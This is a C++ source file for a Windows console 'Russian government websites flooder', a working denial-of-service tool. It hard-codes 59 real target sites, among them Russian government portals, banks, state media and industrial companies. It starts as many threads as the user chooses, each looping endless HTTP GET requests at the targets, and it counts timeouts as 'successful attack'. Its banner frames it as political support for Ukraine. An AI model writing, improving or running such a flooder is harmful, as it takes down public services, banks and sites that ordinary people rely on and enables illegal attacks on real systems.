#define CPPHTTPLIB_OPENSSL_SUPPORT

#include <iostream>
#include "../include/httplib.h"
#include "../include/color.hpp"
#include <fcntl.h>  
#include <io.h>  
#include <stdio.h>
#include <thread>
#include <chrono>

using namespace std::chrono_literals;
using std::cout;
using std::wcout;
using std::cin;
using std::endl;

std::string center(std::string input, int width = 113) {
    return std::string((width - input.length()) / 2, ' ') + input;
}

const wchar_t* emblem[] = {
	L"█████████████████████████                    ▓▓▓▓▓▓▓▓▓▓▓▓▒▓▓▓▓▓▓▓▓▓▓▓▓",
	L"███████████▓▓▓▓██████████                    ▓▓▓▓▒▓▓▓▓▓▓▒▒▒▓▓▓▓▓▓▒▒▓▓▓",
	L"███▓▒░░▒▓█▓▓▓░░██▒░░▒▓███                    ▓▓▓▒▒▒▒▓▓▓▓▒▒▒▓▓▓▓▒▒▒▒▓▓▓",
	L"█▓▒░░▒░▓░▒██▓░▒▓░▒▒▒▒▒▒██                    ▓▓▓▒▒▓▓▒▓▓▓▓▒▒▓▓▓▒▓▓▒▒▓▓▓",
	L"█▒░░░░▓▓█▒▓▒▒▓▓▒▒▒▓▓░▒▒▒█                    ▓▓▓▒▒▓▓▒▒▓▓▒▒▒▓▓▒▒▓▓▒▒▓▓▓",
	L"█▓▒░▒░▒▒░▒░░▒▒▓▓░▒▒▒▒░▒▓█                    ▓▓▓▒▒▓▓▒▒▓▓▒▒▒▓▓▒▒▓▓▒▒▓▓▓",
	L"█▓▒▒░░░░░░░▒▒▒▒░░▒░▒░▒▒▒█                    ▓▓▓▒▒▒▒▓▓▓▒▒▓▒▒▓▓▓▒▒▒▒▓▓▓",
	L"██▓░░▒░░▒▒░▒░▒░░░▒░▒░▒▓▓█                    ▓▓▓▒▒▓▒▒▒▒▒▓▓▓▒▒▒▒▒▓▒▒▓▓▓",
	L"██▒▓▒▓░▒▓▒▒▒░▒░▒▓▓░▒▒▒▓██                    ▓▓▓▒▒▓▓▓▒▒▓▒▒▒▓▒▒▓▓▓▒▒▓▓▓",
	L"█████▓▓█▒▒▒▓▒▓▒▒▒█▓██████                    ▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓",
	L"███████▓▓▓▓▒▒▓▓█▓▒███████                    ▓▓▓▓▓▓▓▓▓▒▓▓▒▓▓▒▓▓▓▓▓▓▓▓▓",
	L"████▓▓▒▓▓▒▒▓░▒▒▒▓▓▒▒▓████                    ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓",
	L"█████████▓▓▓▒▓▓▓█████████                    ▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▓▓"
};

const char* targets[] = {
	"https://lenta.ru",
	"https://ria.ru",
	"https://www.rbc.ru",
	"https://www.rt.com",
	"http://kremlin.ru",
	"http://en.kremlin.ru",
	"https://smotrim.ru",
	"https://tass.ru",
	"https://tvzvezda.ru",
	"https://vsoloviev.ru",
	"https://www.1tv.ru",
	"https://www.vesti.ru",
	"https://online.sberbank.ru",
	"https://sberbank.ru",
	"https://zakupki.gov.ru",
	"https://www.gosuslugi.ru",
	"https://er.ru",
	"https://www.rzd.ru",
	"https://rzdlog.ru",
	"https://vgtrk.ru",
	"https://www.interfax.ru",
	"https://www.mos.ru/uslugi",
	"http://government.ru",
	"https://mil.ru",
	"https://www.nalog.gov.ru",
	"https://customs.gov.ru",
	"https://pfr.gov.ru",
	"https://rkn.gov.ru",
	"https://www.gazprombank.ru",
	"https://www.vtb.ru",
	"https://www.gazprom.ru",
	"https://lukoil.ru",
	"https://magnit.ru",
	"https://www.nornickel.com",
	"https://www.surgutneftegas.ru",
	"https://www.tatneft.ru",
	"https://www.evraz.com",
	"https://nlmk.com",
	"https://www.sibur.ru",
	"https://www.severstal.com",
	"https://www.metalloinvest.com",
	"https://nangs.org",
	"https://rmk-group.ru",
	"https://www.tmk-group.ru",
	"https://ya.ru",
	"https://www.polymetalinternational.com",
	"https://www.uralkali.com",
	"https://www.eurosib.ru",
	"https://ugmk.ua",
	"https://omk.ru",
	"https://sputniknews.com",
	"https://lt.sputniknews.ru",
	"https://baltnews.lt",
	"https://sputniknews.ru",
	"https://regnum.ru",
	"https://iz.ru",
	"https://eadaily.com",
	"https://www.rubaltic.ru",
	"https://lt.rubaltic.ru"
};

int requests = 0;
int errors = 0;

void botLoop()
{
	while(true)
	{
		requests++;

		const char* url = targets[requests % 59];
		httplib::Client client(url);

		if(client.Get("/") == nullptr) errors++;
	}
}

void loggerLoop()
{
	while(true)
	{
		std::this_thread::sleep_for(1s);
		std::string stats = "Replied: " + std::to_string(requests - errors) + " Timeouted: " + std::to_string(errors);
		cout << "\r" << std::string((120 - stats.size()) / 2, ' ') << stats;
	}
}

int main()
{
	SetConsoleTitleA("Russian government websites flooder | Made in Poland | Slava Ukrainie!");

	cout << endl << endl;
	cout << std::string((120 - 35) / 2, ' ') + dye::light_aqua("Russian government websites flooder") << endl;
	cout << std::string((120 - 42) / 2, ' ') + dye::bright_white("Made in ") + dye::bright_white_on_red("Poland") + dye::bright_white_on_black(" to support ") + dye::light_yellow_on_blue("Ukrainian") + dye::bright_white_on_black(" People") << endl;
	cout << endl << endl;

	_setmode(_fileno(stdout), _O_U16TEXT);

	for(int i = 0; i < 13; ++i)
	{
		wcout << std::wstring((120 - 70) / 2, ' ') << emblem[i] << endl;
	}

	_setmode(_fileno(stdout), _O_TEXT);

	cout << endl << endl;
	cout << std::string(120, '=');
	cout << endl << endl << std::string((120 - 77) / 2, ' ') << "Replied: Servers are responding, tho the response might be from reverse proxy" << std::endl << std::string((120 - 72) / 2, ' ') << "Timeouted: most likely out of service, in other words: successful attack" << endl << endl;

	cout << std::string((120 - 67) / 2, ' ') << "Specify threads amount (5mbps internet speed per 100 threads used)" << endl;

	int threadsNum;

	cin >> threadsNum;

	if(!cin.good())
	{
		cout << "Specify number! Press any key to exit.";
		cin.get();
		return -1;
	}

	for (int i = 0; i < threadsNum; ++i) new std::thread(botLoop);

	std::thread(loggerLoop).join();
}